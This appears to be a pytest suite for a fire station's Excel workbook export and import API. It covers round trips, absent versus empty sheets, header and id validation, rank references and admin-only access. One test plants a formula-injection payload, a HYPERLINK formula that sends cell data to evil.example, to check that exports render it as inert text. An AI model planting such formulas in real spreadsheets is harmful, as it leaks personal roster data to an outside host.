"""The station-data workbook — download, edit, upload back.

The tests that matter here are the ones about what the file does NOT do: an absent sheet is
not an empty one, a dropped column is not a successful import, an id Excel turned into a date
is not a rename, and a `when` rule that no spreadsheet can express still has to be there
afterwards. Re-importing an untouched export changing nothing is the single assertion that
covers most of them at once.
"""

import io

import pytest
from openpyxl import Workbook, load_workbook
from sqlalchemy import select

from app.models import DeploymentConfig, Personnel, PersonnelExternalIdentity
from app.services.station_workbook import (
    COLUMNS,
    SHEET_BESTAENDE,
    SHEET_DIENSTGRADE,
    SHEET_FAHRZEUGE,
    SHEET_MANNSCHAFT,
    SHEET_MITTEL,
    SHEET_PARTNER,
    SHEET_QUELLEN,
    SHEET_SYMBOLFELDER,
)

# A station with something in every section the workbook touches — including the two shapes
# the sheet cannot express (`when`, `winfapAlias`), which is what makes the round trip a real
# test rather than a tautology.
STATION_CONFIG = {
    "identity": {"appName": "Feuerwehr Steintal", "accentColor": "#1d6f5c"},
    "doctrine": {"alarmBar": 60, "contactIntervalMin": 10},
    "roster": {
        "ranks": [
            {"key": "hptm", "label": "Hauptmann", "abbr": "Hptm", "tier": "officer"},
            {"key": "wm", "label": "Wachtmeister", "abbr": "Wm", "tier": "nco"},
            {"key": "fwm", "label": "Feuerwehrmann", "abbr": "Fwm", "tier": "crew"},
        ],
        "nameOrder": "last-first",
    },
    "fleet": {
        "vehicles": [
            {"id": "tlf-31", "label": "TLF 31", "winfapAlias": "TLF Steintal"},
            {"id": "mtf-11", "label": "MTF 11"},
        ],
        "attributeLists": [{"symbol": "vkf-fahrzeug", "field": "Typ", "options": ["TLF", "ADL"]}],
        "partner": {
            "feuerwehr": ["FW Nachbardorf"],
            "sanitaet": [],
            "polizei": [],
            "chemiewehr": [],
            "zivilschutz": [],
        },
    },
    "mittel": {
        "catalogue": [
            {
                "id": "schlauch-75",
                "label": "Schlauch 75 mm",
                "unit": "Stk",
                "stock": [{"source": "tlf-31", "qty": 6}],
                "symbol": "leitung",
                "when": {"Typ": "Druckleitung"},
                "verbrauchbar": False,
            },
            {"id": "oelbinder", "label": "Ölbinder", "unit": "kg", "verbrauchbar": True},
        ],
        "sources": [{"id": "tlf-31", "label": "TLF 31"}, {"id": "magazin", "label": "Magazin"}],
        "units": ["Stk", "kg"],
    },
    "report": {"partnerOrgs": ["Polizei BL"], "hoursRounding": {"stepMin": 30, "graceMin": 5}},
}

CREW = [("Meier Anna", "hptm"), ("Bläsi Vreni", "wm"), ("Studer Tim", "fwm")]


@pytest.fixture
async def station(client, db_session, admin_login):
    """A configured station with a small Wehr, and an unlocked admin surface."""
    await admin_login(client)
    db_session.add(DeploymentConfig(id=1, config_json=STATION_CONFIG))
    for name, rank in CREW:
        db_session.add(Personnel(display_name=name, rank=rank, is_active=True))
    await db_session.commit()
    return db_session


def sheets_of(data: bytes) -> dict[str, list[list]]:
    """Every sheet of a workbook as ``name → data rows`` (header dropped)."""
    wb = load_workbook(io.BytesIO(data))
    out = {name: [list(r) for r in wb[name].iter_rows(min_row=2, values_only=True)] for name in wb.sheetnames}
    wb.close()
    return out


def make_xlsx(sheets: dict[str, list[list]], headers: dict[str, list] | None = None) -> bytes:
    """A workbook carrying exactly the named sheets — the way an operator's edited file looks.
    Sheets NOT named are absent, which is the distinction half of these tests are about."""
    wb = Workbook()
    wb.remove(wb.active)
    for name, rows in sheets.items():
        ws = wb.create_sheet(name)
        ws.append((headers or {}).get(name) or list(COLUMNS[name]))
        for row in rows:
            ws.append(row)
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


def upload(data: bytes, name: str = "stationsdaten.xlsx") -> dict:
    return {"file": (name, data, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")}


async def export(client) -> bytes:
    r = await client.get("/api/station-workbook/export")
    assert r.status_code == 200, r.text
    return r.content


async def preview(client, data: bytes) -> dict:
    r = await client.post("/api/station-workbook/preview", files=upload(data))
    assert r.status_code == 200, r.text
    return r.json()


async def stored(db) -> dict:
    db.expire_all()
    row = (await db.execute(select(DeploymentConfig).where(DeploymentConfig.id == 1))).scalar_one()
    return dict(row.config_json)


def impact(payload: dict, sheet: str) -> dict:
    return next(s for s in payload["sheets"] if s["sheet"] == sheet)


# ── the round trip ─────────────────────────────────────────────────────────────────────


async def test_untouched_export_reimports_as_a_no_op(client, station):
    """The test that catches a corrupted id and a lost `when` in one go.

    If an id came back capitalised, date-shaped or number-shaped, the sheet's rows would no
    longer match the stored ones and this would read as removals plus creations. If `when` or
    `winfapAlias` were rebuilt from the sheet instead of carried over, the stored document
    would differ afterwards.
    """
    before = await stored(station)
    data = await export(client)
    body = await preview(client, data)

    assert body["ok"] is True
    assert body["errors"] == []
    assert body["emptied"] == []
    for sheet in body["sheets"]:
        assert sheet["present"] is True, sheet
        assert (sheet["created"], sheet["updated"], sheet["removed_total"]) == (0, 0, 0), sheet

    r = await client.post("/api/station-workbook/import", files=upload(data), data={"digest": body["digest"]})
    assert r.status_code == 200, r.text
    after = await stored(station)
    assert after["mittel"]["catalogue"][0]["when"] == {"Typ": "Druckleitung"}
    assert after["fleet"]["vehicles"][0]["winfapAlias"] == "TLF Steintal"
    assert after["mittel"]["catalogue"][0]["stock"] == [{"source": "tlf-31", "qty": 6}]
    # …and nothing the workbook has no sheet for moved either.
    for path in ("identity", "doctrine", "journal", "map", "alarms"):
        assert after.get(path) == before.get(path) or path not in before


async def test_export_carries_every_sheet_and_its_rows(client, station):
    data = sheets_of(await export(client))
    assert set(data) == set(COLUMNS)
    assert [r[0] for r in data[SHEET_FAHRZEUGE]] == ["tlf-31", "mtf-11"]
    assert [r[0] for r in data[SHEET_DIENSTGRADE]] == ["hptm", "wm", "fwm"]
    assert data[SHEET_BESTAENDE] == [["schlauch-75", "tlf-31", 6]]
    assert data[SHEET_SYMBOLFELDER] == [
        ["vkf-fahrzeug", "Typ", "TLF"],
        ["vkf-fahrzeug", "Typ", "ADL"],
    ]
    # Both partner homes in one sheet, told apart by the Kategorie column
    assert sorted(data[SHEET_PARTNER]) == [["Feuerwehr", "FW Nachbardorf"], ["Rapport", "Polizei BL"]]
    # Ranks are written as their LABEL — the operator edits words, not slugs
    assert sorted(r[1] for r in data[SHEET_MANNSCHAFT]) == ["Feuerwehrmann", "Hauptmann", "Wachtmeister"]


async def test_edited_workbook_changes_exactly_what_was_edited(client, station):
    data = sheets_of(await export(client))
    data[SHEET_FAHRZEUGE].append(["adl-41", "ADL 41"])
    data[SHEET_MITTEL][1][1] = "Ölbinder (Granulat)"
    body = await preview(client, make_xlsx(data))

    assert impact(body, SHEET_FAHRZEUGE)["created"] == 1
    assert impact(body, SHEET_MITTEL)["updated"] == 1
    assert impact(body, SHEET_MITTEL)["unchanged"] == 1
    assert body["ok"] is True

    r = await client.post("/api/station-workbook/import", files=upload(make_xlsx(data)))
    assert r.status_code == 200, r.text
    after = await stored(station)
    assert [v["id"] for v in after["fleet"]["vehicles"]] == ["tlf-31", "mtf-11", "adl-41"]
    assert after["mittel"]["catalogue"][1]["label"] == "Ölbinder (Granulat)"
    # …and the rule that has no column is still on the item that does have one
    assert after["mittel"]["catalogue"][0]["when"] == {"Typ": "Druckleitung"}


# ── absent is not empty ────────────────────────────────────────────────────────────────


async def test_absent_sheet_leaves_its_section_alone(client, station):
    """A workbook with no Fahrzeuge tab must not touch the fleet."""
    body = await preview(client, make_xlsx({SHEET_QUELLEN: [["magazin", "Magazin"], ["tlf-31", "TLF 31"]]}))
    assert impact(body, SHEET_FAHRZEUGE) == {
        "sheet": SHEET_FAHRZEUGE,
        "present": False,
        "rows": 0,
        "created": 0,
        "updated": 0,
        "unchanged": 0,
        "removed": [],
        "removed_total": 0,
        "removal_kind": "none",
    }
    r = await client.post(
        "/api/station-workbook/import",
        files=upload(make_xlsx({SHEET_QUELLEN: [["magazin", "Magazin"], ["tlf-31", "TLF 31"]]})),
    )
    assert r.status_code == 200, r.text
    after = await stored(station)
    assert [v["id"] for v in after["fleet"]["vehicles"]] == ["tlf-31", "mtf-11"]


async def test_present_but_empty_sheet_clears_its_section_and_says_so(client, station):
    """The other half of the same rule: a header-only sheet is how a station clears a list on
    purpose. It is allowed — and it is named in the preview before it happens."""
    data = make_xlsx({SHEET_FAHRZEUGE: []})
    body = await preview(client, data)
    fleet = impact(body, SHEET_FAHRZEUGE)
    assert fleet["present"] is True
    assert fleet["removed_total"] == 2
    assert sorted(fleet["removed"]) == ["mtf-11", "tlf-31"]
    assert fleet["removal_kind"] == "removed"
    assert "fleet.vehicles" in body["emptied"]

    r = await client.post("/api/station-workbook/import", files=upload(data))
    assert r.status_code == 200, r.text
    assert (await stored(station))["fleet"]["vehicles"] == []


async def test_preview_writes_nothing_and_cancelling_is_writing_nothing(client, station):
    before = await stored(station)
    await preview(client, make_xlsx({SHEET_FAHRZEUGE: []}))
    await preview(client, make_xlsx({SHEET_DIENSTGRADE: []}))
    assert await stored(station) == before
    # …and no history entry was kept either, because nothing was replaced
    assert (await client.get("/api/config/history")).json() == []


# ── strict headers ─────────────────────────────────────────────────────────────────────


async def test_unknown_header_is_refused_naming_expected_and_found(client, station):
    """`extra="ignore"` on every config model means a renamed column would import clean and
    silently blank the field. The refusal is the only thing that tells the operator."""
    data = make_xlsx(
        {SHEET_MITTEL: [["oelbinder", "Ölbinder", "kg", None, None, "ja"]]},
        headers={SHEET_MITTEL: ["Kennung", "Bezeichnung", "Einheiten", "Kategorie", "Symbol", "Verbrauchbar"]},
    )
    body = await preview(client, data)
    assert body["ok"] is False
    assert any("unerwartete Kopfzeile" in e and SHEET_MITTEL in e and "Einheiten" in e for e in body["errors"])
    r = await client.post("/api/station-workbook/import", files=upload(data))
    assert r.status_code == 400
    assert (await stored(station))["mittel"]["catalogue"][0]["unit"] == "Stk"


async def test_missing_column_is_refused_too(client, station):
    body = await preview(
        client,
        make_xlsx({SHEET_FAHRZEUGE: [["tlf-31"]]}, headers={SHEET_FAHRZEUGE: ["Kennung"]}),
    )
    assert body["ok"] is False
    assert any("unerwartete Kopfzeile" in e for e in body["errors"])


async def test_unknown_sheet_is_reported_not_swallowed(client, station):
    body = await preview(client, make_xlsx({SHEET_FAHRZEUGE: [["tlf-31", "TLF 31"], ["mtf-11", "MTF 11"]]}))
    assert body["warnings"] == []
    wb = Workbook()
    wb.remove(wb.active)
    wb.create_sheet("Fahrzueg").append(["Kennung", "Bezeichnung"])
    buf = io.BytesIO()
    wb.save(buf)
    body = await preview(client, buf.getvalue())
    assert any("Fahrzueg" in w for w in body["warnings"])


# ── ids are join keys ──────────────────────────────────────────────────────────────────


async def test_a_date_shaped_id_is_refused_with_its_cell(client, station):
    """«2-1» in a General cell is a date the moment Excel touches it. Rewriting it to
    something plausible would orphan every Traccar position and milestone filed under it."""
    import datetime as dt

    data = make_xlsx({SHEET_FAHRZEUGE: [[dt.datetime(2026, 2, 1), "Fahrzeug 2-1"]]})
    body = await preview(client, data)
    assert body["ok"] is False
    assert any("Datum" in e and f"{SHEET_FAHRZEUGE} Zeile 2" in e for e in body["errors"])
    assert (await client.post("/api/station-workbook/import", files=upload(data))).status_code == 400


async def test_a_number_shaped_id_is_refused_with_its_cell(client, station):
    data = make_xlsx({SHEET_QUELLEN: [[11, "Magazin"]]})
    body = await preview(client, data)
    assert any("Zahl" in e and "«11»" in e and f"{SHEET_QUELLEN} Zeile 2" in e for e in body["errors"])


async def test_a_capitalised_new_id_is_refused_but_an_existing_one_is_not(client, station):
    """A NEW key is a decision being made right now, so it has to be well formed. A key the
    station ALREADY has is out there in Traccar and in closed incidents — refusing it would
    make the station's own export unimportable."""
    body = await preview(client, make_xlsx({SHEET_FAHRZEUGE: [["tlf-31", "TLF 31"], ["ADL-41", "ADL 41"]]}))
    assert body["ok"] is False
    assert any("«ADL-41»" in e and f"{SHEET_FAHRZEUGE} Zeile 3" in e for e in body["errors"])
    assert not any(f"{SHEET_FAHRZEUGE} Zeile 2" in e for e in body["errors"])


async def test_a_planted_formula_exports_as_inert_text(client, db_session, station):
    """The other direction, and the one that crosses a privilege boundary.

    Adding a member is `EditorOrAdmin`; exporting the Arbeitsmappe is admin. openpyxl decides a
    cell is a formula from its first character, so an editor who names somebody «=HYPERLINK(…)»
    plants live code in the file an ADMIN then downloads and opens — one click from the whole
    roster leaving via the URL, and DDE in LibreOffice. That is the feature's happy path, not an
    abuse of it: export → open is the entire point of the sheet.

    Asserted on `data_type`, because that is what actually decides. A cell openpyxl writes as
    `f` becomes an `<f>` element and Excel evaluates it; `s` is inline text and Excel shows it.
    """
    payload = '=HYPERLINK("https://evil.example/?x="&A2,"Mannschaft")'
    db_session.add(Personnel(display_name=payload, rank="fw", is_active=True))
    await db_session.commit()

    wb = load_workbook(io.BytesIO(await export(client)))
    try:
        cells = [c for row in wb[SHEET_MANNSCHAFT].iter_rows(min_row=2) for c in row]
        planted = [c for c in cells if c.value == payload]
        assert planted, "the planted name should still be exported — defused, not dropped"
        assert all(c.data_type == "s" for c in planted), "exported as a live formula"
        # …and nothing else on the sheet became a formula either.
        assert not any(c.data_type == "f" for c in cells)
    finally:
        wb.close()


async def test_formulas_never_import_as_their_own_text(client, station):
    """openpyxl without `data_only=True` hands back «=CONCAT(...)». A vehicle id shaped like a
    formula matches no device that has ever existed."""
    wb = Workbook()
    wb.remove(wb.active)
    ws = wb.create_sheet(SHEET_FAHRZEUGE)
    ws.append(list(COLUMNS[SHEET_FAHRZEUGE]))
    ws.append(['=CONCAT("tlf","-31")', "TLF 31"])
    buf = io.BytesIO()
    wb.save(buf)
    body = await preview(client, buf.getvalue())
    # data_only=True with no cached value yields an empty cell — refused for a missing key,
    # never accepted as the literal formula string.
    assert body["ok"] is False
    assert not any("CONCAT" in e for e in body["errors"])


# ── the one cross-sheet reference ──────────────────────────────────────────────────────


async def test_stock_pointing_at_a_missing_source_is_refused_with_its_row(client, station):
    data = make_xlsx(
        {
            SHEET_QUELLEN: [["tlf-31", "TLF 31"]],
            SHEET_BESTAENDE: [["schlauch-75", "tlf-31", 6], ["schlauch-75", "hlf-99", 2]],
        }
    )
    body = await preview(client, data)
    assert body["ok"] is False
    assert any(f"{SHEET_BESTAENDE} Zeile 3" in e and "«hlf-99»" in e for e in body["errors"])
    assert (await client.post("/api/station-workbook/import", files=upload(data))).status_code == 400


async def test_dropping_a_source_that_stock_still_uses_is_refused(client, station):
    body = await preview(client, make_xlsx({SHEET_QUELLEN: [["magazin", "Magazin"]]}))
    assert body["ok"] is False
    assert any("«tlf-31»" in e and "schlauch-75" in e for e in body["errors"])


async def test_a_source_may_go_once_the_bestaende_sheet_rebooks_it(client, station):
    """The refusal is about the half of an edit that was forgotten, not about the edit."""
    body = await preview(
        client,
        make_xlsx(
            {
                SHEET_QUELLEN: [["magazin", "Magazin"]],
                SHEET_BESTAENDE: [["schlauch-75", "magazin", 6]],
            }
        ),
    )
    assert body["ok"] is True, body["errors"]


# ── two meanings of absent ─────────────────────────────────────────────────────────────


async def test_a_person_missing_from_the_sheet_is_deactivated_not_deleted(client, station):
    data = make_xlsx({SHEET_MANNSCHAFT: [["Meier Anna", "Hauptmann", None, None, "ja"]]})
    body = await preview(client, data)
    crew = impact(body, SHEET_MANNSCHAFT)
    assert crew["removal_kind"] == "deactivated"
    assert sorted(crew["removed"]) == ["Bläsi Vreni", "Studer Tim"]

    assert (await client.post("/api/station-workbook/import", files=upload(data))).status_code == 200
    station.expire_all()
    people = {p.display_name: p.is_active for p in (await station.execute(select(Personnel))).scalars()}
    assert people == {"Meier Anna": True, "Bläsi Vreni": False, "Studer Tim": False}


async def test_a_vehicle_missing_from_the_sheet_is_removed_and_says_removed(client, station):
    body = await preview(client, make_xlsx({SHEET_FAHRZEUGE: [["tlf-31", "TLF 31"]]}))
    fleet = impact(body, SHEET_FAHRZEUGE)
    assert fleet["removal_kind"] == "removed"
    assert fleet["removed"] == ["mtf-11"]


async def test_aktiv_nein_deactivates_and_ja_brings_somebody_back(client, station):
    rows = [
        ["Meier Anna", "Hauptmann", None, None, "nein"],
        ["Bläsi Vreni", "Wachtmeister", None, None, "ja"],
        ["Studer Tim", "Feuerwehrmann", None, None, "ja"],
    ]
    assert (
        await client.post("/api/station-workbook/import", files=upload(make_xlsx({SHEET_MANNSCHAFT: rows})))
    ).status_code == 200
    station.expire_all()
    people = {p.display_name: p.is_active for p in (await station.execute(select(Personnel))).scalars()}
    assert people["Meier Anna"] is False

    rows[0][4] = "ja"
    assert (
        await client.post("/api/station-workbook/import", files=upload(make_xlsx({SHEET_MANNSCHAFT: rows})))
    ).status_code == 200
    station.expire_all()
    people = {p.display_name: p.is_active for p in (await station.execute(select(Personnel))).scalars()}
    assert people["Meier Anna"] is True


async def test_renaming_a_split_name_says_what_the_rename_costs(client, db_session, station):
    """⚠️ A rename clears the stored first/last halves, and the person stops following
    `roster.nameOrder` afterwards. That is triggered from a spreadsheet cell and is invisible
    everywhere else, so the preview says it — per person, before the write.

    Note which row can even BE a rename: only one matched on Quelle + Externe ID. Without an
    identity the name IS the key, so a changed name is a new person plus a deactivation — that
    is the case below this one."""
    synced = Personnel(display_name="Roth Livia", first_name="Livia", last_name="Roth", rank="wm", is_active=True)
    db_session.add(synced)
    await db_session.flush()
    db_session.add(PersonnelExternalIdentity(personnel_id=synced.id, provider="divera", external_id="4711"))
    await db_session.commit()

    rows = [[name, None, None, None, "ja"] for name, _ in CREW]
    body = await preview(
        client,
        make_xlsx({SHEET_MANNSCHAFT: [*rows, ["Roth-Meier Livia", "Wachtmeister", "divera", "4711", "ja"]]}),
    )
    assert body["ok"] is True, body["errors"]
    assert impact(body, SHEET_MANNSCHAFT)["created"] == 0, "matched on the identity, not renamed into a new person"
    assert any("«Roth Livia»" in w and "«Roth-Meier Livia»" in w and "Namensreihenfolge" in w for w in body["warnings"])

    # …and the same file WITHOUT the rename says nothing, or the line becomes noise
    quiet = await preview(
        client,
        make_xlsx({SHEET_MANNSCHAFT: [*rows, ["Roth Livia", "Wachtmeister", "divera", "4711", "ja"]]}),
    )
    assert quiet["warnings"] == []


async def test_a_hand_entered_rename_costs_nothing_and_is_not_flagged(client, station):
    """Nothing to lose for crew stored as one string — the warning would be noise."""
    rows = [["Meier Annina", "Hauptmann", None, None, "ja"]] + [[name, None, None, None, "ja"] for name, _ in CREW[1:]]
    body = await preview(client, make_xlsx({SHEET_MANNSCHAFT: rows}))
    assert body["warnings"] == []
    assert impact(body, SHEET_MANNSCHAFT)["created"] == 1  # a new name IS a new person here


async def test_new_people_are_created_and_the_count_is_what_was_confirmed(client, station):
    rows = [[name, None, None, None, "ja"] for name, _ in CREW] + [["Roth Livia", "Wachtmeister", None, None, "ja"]]
    body = await preview(client, make_xlsx({SHEET_MANNSCHAFT: rows}))
    crew = impact(body, SHEET_MANNSCHAFT)
    assert (crew["created"], crew["removed_total"]) == (1, 0)

    r = await client.post("/api/station-workbook/import", files=upload(make_xlsx({SHEET_MANNSCHAFT: rows})))
    assert r.status_code == 200, r.text
    station.expire_all()
    people = {p.display_name: p.rank for p in (await station.execute(select(Personnel))).scalars()}
    assert people["Roth Livia"] == "wm"
    # an empty Grad cell means «not stated» — it must not strip the rank off the whole Wehr
    assert people["Meier Anna"] == "hptm"


# ── ranks are referenced by every person ───────────────────────────────────────────────


async def test_dropping_a_rank_somebody_still_carries_is_refused_by_name(client, station):
    body = await preview(
        client,
        make_xlsx(
            {
                SHEET_DIENSTGRADE: [
                    ["hptm", "Hauptmann", "Hptm", "Offizier"],
                    ["fwm", "Feuerwehrmann", "Fwm", "Mannschaft"],
                ]
            }
        ),
    )
    assert body["ok"] is False
    assert any("«wm»" in e and "Bläsi Vreni" in e for e in body["errors"])


async def test_a_rank_may_go_once_its_people_are_regraded_in_the_same_file(client, station):
    body = await preview(
        client,
        make_xlsx(
            {
                SHEET_DIENSTGRADE: [
                    ["hptm", "Hauptmann", "Hptm", "Offizier"],
                    ["fwm", "Feuerwehrmann", "Fwm", "Mannschaft"],
                ],
                SHEET_MANNSCHAFT: [
                    ["Meier Anna", "Hauptmann", None, None, "ja"],
                    ["Bläsi Vreni", "Feuerwehrmann", None, None, "ja"],
                    ["Studer Tim", "Feuerwehrmann", None, None, "ja"],
                ],
            }
        ),
    )
    assert body["ok"] is True, body["errors"]
    assert impact(body, SHEET_DIENSTGRADE)["removed"] == ["wm"]


async def test_a_grad_added_on_one_tab_may_be_used_on_another(client, station):
    body = await preview(
        client,
        make_xlsx(
            {
                SHEET_DIENSTGRADE: [
                    ["hptm", "Hauptmann", "Hptm", "Offizier"],
                    ["wm", "Wachtmeister", "Wm", "Unteroffizier"],
                    ["fwm", "Feuerwehrmann", "Fwm", "Mannschaft"],
                    ["kdt", "Kommandant", "Kdt", "Offizier"],
                ],
                SHEET_MANNSCHAFT: [
                    ["Meier Anna", "Kommandant", None, None, "ja"],
                    ["Bläsi Vreni", "Wachtmeister", None, None, "ja"],
                    ["Studer Tim", "Feuerwehrmann", None, None, "ja"],
                ],
            }
        ),
    )
    assert body["ok"] is True, body["errors"]


async def test_an_unknown_grad_is_refused_with_its_row(client, station):
    body = await preview(client, make_xlsx({SHEET_MANNSCHAFT: [["Meier Anna", "Sdt", None, None, "ja"]]}))
    assert body["ok"] is False
    assert any(f"{SHEET_MANNSCHAFT} Zeile 2" in e and "«Sdt»" in e for e in body["errors"])


async def test_an_unknown_stufe_names_the_allowed_set(client, station):
    body = await preview(client, make_xlsx({SHEET_DIENSTGRADE: [["hptm", "Hauptmann", "Hptm", "Kader"]]}))
    assert any("Offizier" in e and "Unteroffizier" in e and "Mannschaft" in e for e in body["errors"])


# ── the write itself ───────────────────────────────────────────────────────────────────


async def test_one_bad_cell_refuses_the_whole_file(client, station):
    """No partial import — a station whose Dienstgrade and Mannschaft disagree about which
    ranks exist is worse off than one whose upload failed."""
    data = make_xlsx(
        {
            SHEET_FAHRZEUGE: [["tlf-31", "TLF 31"], ["mtf-11", "MTF 11"], ["adl-41", "ADL 41"]],
            SHEET_QUELLEN: [["tlf-31", "TLF 31"], ["Magazin!", "Magazin"]],
        }
    )
    r = await client.post("/api/station-workbook/import", files=upload(data))
    assert r.status_code == 400
    after = await stored(station)
    assert [v["id"] for v in after["fleet"]["vehicles"]] == ["tlf-31", "mtf-11"]


async def test_a_write_is_kept_so_it_can_be_undone(client, station):
    await client.post("/api/station-workbook/import", files=upload(make_xlsx({SHEET_FAHRZEUGE: []})))
    rows = (await client.get("/api/config/history")).json()
    assert rows and rows[0]["source"] == "workbook"
    assert "fleet.vehicles" in rows[0]["emptied"]


async def test_an_unchanged_document_is_not_written_at_all(client, station):
    data = await export(client)
    await client.post("/api/station-workbook/import", files=upload(data))
    assert (await client.get("/api/config/history")).json() == []


async def test_a_file_edited_after_the_preview_is_refused(client, station):
    """«Confirm» has to mean THIS file. An operator who saves one more change in Excel between
    the preview and the button gets a fresh preview, not a silent apply."""
    body = await preview(client, make_xlsx({SHEET_FAHRZEUGE: [["tlf-31", "TLF 31"], ["mtf-11", "MTF 11"]]}))
    changed = make_xlsx({SHEET_FAHRZEUGE: []})
    r = await client.post("/api/station-workbook/import", files=upload(changed), data={"digest": body["digest"]})
    assert r.status_code == 409
    assert [v["id"] for v in (await stored(station))["fleet"]["vehicles"]] == ["tlf-31", "mtf-11"]


async def test_a_non_xlsx_upload_is_refused_in_plain_language(client, station):
    r = await client.post("/api/station-workbook/preview", files={"file": ("roster.csv", b"name\nMeier", "text/csv")})
    assert r.status_code == 400
    assert ".xlsx" in r.json()["detail"]

    r = await client.post("/api/station-workbook/preview", files=upload(b"not a zip at all"))
    assert r.status_code == 400
    assert "Excel-Arbeitsmappe" in r.json()["detail"]


async def test_the_whole_surface_is_admin_only(client, station):
    await client.post("/api/admin/logout")
    assert (await client.get("/api/station-workbook/export")).status_code in (401, 403)
    for path in ("/api/station-workbook/preview", "/api/station-workbook/import"):
        r = await client.post(path, files=upload(make_xlsx({SHEET_FAHRZEUGE: []})))
        assert r.status_code in (401, 403), r.text
    assert [v["id"] for v in (await stored(station))["fleet"]["vehicles"]] == ["tlf-31", "mtf-11"]


async def test_partner_organisations_land_in_their_two_homes(client, station):
    data = make_xlsx({SHEET_PARTNER: [["Rapport", "Polizei BL"], ["Rapport", "REGA"], ["Polizei", "Kapo BL"]]})
    assert (await client.post("/api/station-workbook/import", files=upload(data))).status_code == 200
    after = await stored(station)
    assert after["report"]["partnerOrgs"] == ["Polizei BL", "REGA"]
    assert after["fleet"]["partner"]["polizei"] == ["Kapo BL"]
    # …and the category with no rows left is now empty, which the preview said out loud
    assert after["fleet"]["partner"]["feuerwehr"] == []


async def test_symbol_options_regroup_from_one_row_per_option(client, station):
    data = make_xlsx(
        {
            SHEET_SYMBOLFELDER: [
                ["vkf-fahrzeug", "Typ", "TLF"],
                ["vkf-fahrzeug", "Typ", "ADL"],
                ["vkf-fahrzeug", "Typ", "HLF"],
                ["luefter", "Typ", "Exhauster"],
            ]
        }
    )
    assert (await client.post("/api/station-workbook/import", files=upload(data))).status_code == 200
    lists = (await stored(station))["fleet"]["attributeLists"]
    assert {(a["symbol"], a["field"]): a["options"] for a in lists} == {
        ("vkf-fahrzeug", "Typ"): ["TLF", "ADL", "HLF"],
        ("luefter", "Typ"): ["Exhauster"],
    }
